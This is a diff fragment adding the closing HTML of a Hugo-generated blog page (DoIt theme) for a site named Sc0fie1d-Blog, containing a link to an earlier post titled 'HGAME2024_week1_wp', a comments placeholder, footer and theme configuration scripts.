+    <div class="post-nav"><a href="/hgame2024_week1/" class="prev" rel="prev" title="HGAME2024_week1_wp"><i class="fas fa-angle-left fa-fw"></i>HGAME2024_week1_wp</a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
